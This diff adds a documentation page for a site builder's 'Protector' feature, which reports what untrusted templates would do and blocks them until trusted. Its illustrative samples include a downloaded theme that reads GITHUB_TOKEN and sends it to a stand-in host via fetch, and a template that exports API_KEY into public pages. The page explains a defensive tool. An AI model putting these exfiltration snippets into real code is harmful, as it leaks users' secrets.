@@ -1,0 +1,199 @@
+# ###################
+# Docs: Protector
+# ###################
+[import = Docs: "@/layouts/Docs.arcm" !]
+[import = Code: "@/components/Code.arcm" !]
+[import = hl: "@/components/docs/Hl.arcm" !]
+[import = Text: "@/components/docs/Text.arcm" !]
+[import = Title: "@/components/docs/Title.arcm" !]
+[import = Link: "@/components/docs/Link.arcm" !]
+[import = List: "@/components/docs/List.arcm" !]
+[import = Item: "@/components/docs/Item.arcm" !]
+[import = Note: "@/components/docs/Note.arcm" !]
+
+[Docs = slug: "protector"]
+  [Title = id: "why"]Why it exists[end:Title]
+  [Text]
+    [hl = text: "${ }$" !] code runs on your computer while you build, with your full access: it can read and write files,
+    read your environment variables, run programs and send data anywhere. That is what makes build-time code useful,
+    and it is also why a template you download could do harm:
+  [end:Text]
+  [Code = title: "a theme you downloaded", text: '
+    ${
+      const token = process.env.GITHUB_TOKEN;
+      await fetch("https://stats.example.com/hit?t=" + token);   // your token, sent away
+    }$
+    [article][slot!][end]
+  ' !]
+  [Text]The protector makes sure code you didn\'t write never runs until you have seen what it would do and said yes. Like an editor asking "Do you trust this folder?", it is a look before running.[end:Text]
+  [Note = type: "warning"]
+    [Text]It doesn\'t make code safe, and it can\'t limit what trusted code does. Once you trust a template, it runs with your full access. Only trust what you have read.[end:Text]
+  [end:Note]
+
+  [Title = id: "files"]Your files and templates[end:Title]
+  [List]
+    [Item][strong]Your files:[end] files inside the folder where you run [hl = text: "arcm" !], outside [hl = text: "node_modules" !]. They always run.[end:Item]
+    [Item][strong]Templates:[end] everything else. They wait for your trust. A template is a whole npm package, or a whole folder outside your project.[end:Item]
+  [end:List]
+  [Code = title: "pages/index.arcm", text: '
+    [import = Card: "../src/Card.arcm" !]                       # your file: runs
+    [import = Button: "fancy-ui/Button.arcm" !]                 # template "fancy-ui" (npm)
+    [import = Post: "../../downloads/blog-theme/Post.arcm" !]   # template "../downloads/blog-theme"
+  ' !]
+
+  [Title = id: "report"]The report[end:Title]
+  [Text]The first time a page uses a template you haven\'t trusted, the build stops and shows what the template would do. ArcMoon reads the code to make this list; it runs none of it:[end:Text]
+  [Code = lang: "log", text: '
+    ⚠ Template "../downloads/blog-theme" is not trusted. It would:
+        import     node:fs (read/write), node:child_process
+        risky      fs (write), child_process
+        scripts    helper.js, rt.js
+        fetch      stats.example.com, cdn.example.org
+        env        GITHUB_TOKEN, API_KEY
+        dynamic    eval() at …/blog-theme/Post.arcm:8:3
+        runtime    1 runtime block, 1 [script] file
+        exports    leaked (from process.env!)
+
+      Review it, then run "arcmoon trust ../downloads/blog-theme".
+
+      Nothing was run.
+  ' !]
+  [Text]That report comes from this template. Each line of code shows up in a row:[end:Text]
+  [Code = title: "downloads/blog-theme/Post.arcm", text: '
+    ${
+      import { readFileSync, writeFileSync } from "node:fs";   // import, risky: fs (write)
+      import { exec } from "node:child_process";               // import, risky: child_process
+      import { slug } from "./helper.js";                      // scripts: helper.js
+      const token = process.env.GITHUB_TOKEN;                  // env
+      const res = await fetch("https://stats.example.com/hit"); // fetch
+      export const leaked = process.env.API_KEY;               // env, exports (from process.env!)
+      eval("1 + 1");                                           // dynamic
+    }$
+    runtime ${ console.log(leaked); }$                          # runtime: 1 runtime block
+    [script = src: "./rt.js" !]                                 # scripts: rt.js, runtime: 1 [script] file
+    [article][slot!][end]
+  ' !]
+  [Text]The [hl = text: "cdn.example.org" !] in [hl = text: "fetch" !] comes from [hl = text: "helper.js" !]: imported files are read too, and their findings join the same rows.[end:Text]
+
+  [Title = id: "rows"]What each row means[end:Title]
+  [List]
+    [Item][strong]import:[end] npm packages and [hl = text: "node:" !] modules the code loads. [hl = text: "node:fs" !] is marked [hl = text: "(read)" !] or [hl = text: "(read/write)" !].[end:Item]
+    [Item][strong]risky:[end] the powerful ones, in red: running programs ([hl = text: "child_process" !]), writing files, network sockets ([hl = text: "net" !], [hl = text: "dgram" !], [hl = text: "tls" !]), [hl = text: "vm" !], [hl = text: "worker_threads" !], and ways around these checks.[end:Item]
+    [Item][strong]scripts:[end] local [hl = text: ".js" !] and [hl = text: ".json" !] files it uses, and every file those import in turn.[end:Item]
+    [Item][strong]fetch:[end] the hosts it contacts. If [hl = text: "fetch" !] is passed around instead of called, it says [hl = text: "any host" !].[end:Item]
+    [Item][strong]env:[end] the environment variables it reads, like secrets and tokens. [hl = text: "(all)" !] when it uses [hl = text: "process" !] in a way that could read any of them.[end:Item]
+    [Item][strong]remote:[end] imports from URLs.[end:Item]
+    [Item][strong]dynamic:[end] code that can\'t be read ahead: [hl = text: "eval" !], [hl = text: "Function" !], [hl = text: "import()" !] with a computed name, [hl = text: "process" !] passed around. Each with its place in the file.[end:Item]
+    [Item][strong]runtime:[end] code that goes to your visitors\' browsers, and the npm packages it ships.[end:Item]
+    [Item][strong]exports:[end] build-time values sent to the browser. [hl = text: "(from process.env!)" !] means a secret would end up in your public page.[end:Item]
+  [end:List]
+  [Text]When code hides what it does, the report says so instead of guessing. This npm template passes [hl = text: "fetch" !] and [hl = text: "process" !] around and builds an import name:[end:Text]
+  [Code = title: "node_modules/fancy-ui/Button.arcm", text: '
+    ${
+      import { today } from "tiny-date";
+      const f = fetch;
+      const p = process;
+      const mod = await import("./" + "x.js").catch(() => null);
+    }$
+    runtime ${ import confetti from "canvas-confetti"; }$
+    [button]Built ${ today() }$[end]
+  ' !]
+  [Code = lang: "log", text: '
+    Template "fancy-ui" (⚠ not trusted):
+      import     tiny-date
+      fetch      any host (fetch used indirectly at …/fancy-ui/Button.arcm:3:13)
+      env        (all)
+      dynamic    process used indirectly at …/Button.arcm:4:13, import() with a computed name at …/Button.arcm:5:21
+      runtime    1 runtime block, ships canvas-confetti to visitors
+  ' !]
+
+  [Title = id: "trust"]Trusting a template[end:Title]
+  [Text]Read the template\'s code, compare it with the report, and if you are happy, trust it:[end:Text]
+  [Code = lang: "bash", text: "arcm trust pages/index.arcm" !]
+  [Code = lang: "log", text: '
+    ✓ Trusted "../downloads/blog-theme" (sha256-93751b26245e…)
+        import     node:fs (read/write), node:child_process
+        …
+    Saved to arcmoon.trust.json. If a template changes, ArcMoon asks again.
+  ' !]
+  [Text]Give it a page or a folder: it trusts every template those pages use. Trust is saved next to your config:[end:Text]
+  [Code = lang: "json", title: "arcmoon.trust.json", text: '
+    {
+      "version": 1,
+      "templates": {
+        "../downloads/blog-theme": {
+          "hash": "sha256-93751b26245e5f08b17d3d2635991a2ebfbddb3af62d632d822af0b574fe8e26",
+          "packages": {},
+          "trustedAt": "2026-10-15T05:39:22.827Z"
+        }
+      }
+    }
+  ' !]
+
+  [Title = id: "changes"]When a template changes[end:Title]
+  [Text]The hash covers everything the template can run, so any change means you are asked again:[end:Text]
+  [List]
+    [Item]its [hl = text: ".arcm" !] files;[end:Item]
+    [Item]its local scripts, and every file they import, however deep;[end:Item]
+    [Item]the installed version of each package it imports.[end:Item]
+  [end:List]
+  [Text]Edit [hl = text: "helper.js" !] in the theme, or update [hl = text: "tiny-date" !] from 1.0.0 to 1.0.1, and the next build stops:[end:Text]
+  [Code = lang: "log", text: '
+    ⚠ Template "fancy-ui" has changed since it was trusted. It would:
+        import     tiny-date
+        …
+  ' !]
+  [Text]Review what changed, then trust it again with [hl = text: "arcm trust" !].[end:Text]
+
+  [Title = id: "manage"]Listing and removing trust[end:Title]
+  [Code = lang: "bash", text: '
+    arcm trust --list
+    ../downloads/blog-theme  (trusted 2026-10-15T05:39:22.827Z)
+
+    arcm untrust ../downloads/blog-theme
+    ✓ Untrusted "../downloads/blog-theme"
+  ' !]
+
+  [Title = id: "audit"]Checking your own files[end:Title]
+  [Text][hl = text: "arcm audit" !] shows the same report for your files too, without building. Handy before a review, or to see what a page reaches for:[end:Text]
+  [Code = title: "pages/about.arcm", text: '
+    ${
+      import { readFileSync } from "node:fs";
+      const site = process.env.SITE_NAME;
+    }$
+    runtime ${ console.log("hi"); }$
+    [p]About[end]
+  ' !]
+  [Code = lang: "log", text: '
+    arcm audit pages/about.arcm
+
+    pages/about.arcm
+      Your files (1):
+        import     node:fs (read)
+        env        SITE_NAME
+        runtime    1 runtime block
+
+      No templates from outside my-site.
+  ' !]
+
+  [Title = id: "ci"]In code and CI[end:Title]
+  [Text]Only you can trust. Builds that run without you, like the [Link = text: "JavaScript API", href: "api.html" !], CI or other tools, never ask: they stop with the report. From code, it is a [hl = text: "ProtectorError" !]:[end:Text]
+  [Code = lang: "js", text: '
+    import ArcMoon from "arcmoon";
+
+    try {
+      await new ArcMoon({ filename: "pages/index.arcm" }).compile();
+    } catch (err) {
+      console.log(err.name);   // "ProtectorError", with the report as its message
+    }
+  ' !]
+  [Text]Commit [hl = text: "arcmoon.trust.json" !] with your project. Then CI and your team build with the same trust, and a template that changed stops their build too.[end:Text]
+
+  [Title = id: "tips"]Tips[end:Title]
+  [List]
+    [Item][strong]Read before you trust.[end] The report tells you where to look; the code tells you what it does.[end:Item]
+    [Item][strong]Look hard at [hl = text: "risky" !], [hl = text: "env" !] and [hl = text: "exports" !].[end] A theme rarely needs to run programs, read your tokens, or send build-time values to the browser.[end:Item]
+    [Item][strong]Treat [hl = text: "dynamic" !] and [hl = text: "any host" !] as questions.[end] They mean the code doesn\'t say plainly what it does.[end:Item]
+    [Item][strong]Lock package versions[end] with your package manager\'s lock file, so a template doesn\'t change under you. If it does, ArcMoon asks again.[end:Item]
+  [end:List]
+[end:Docs]
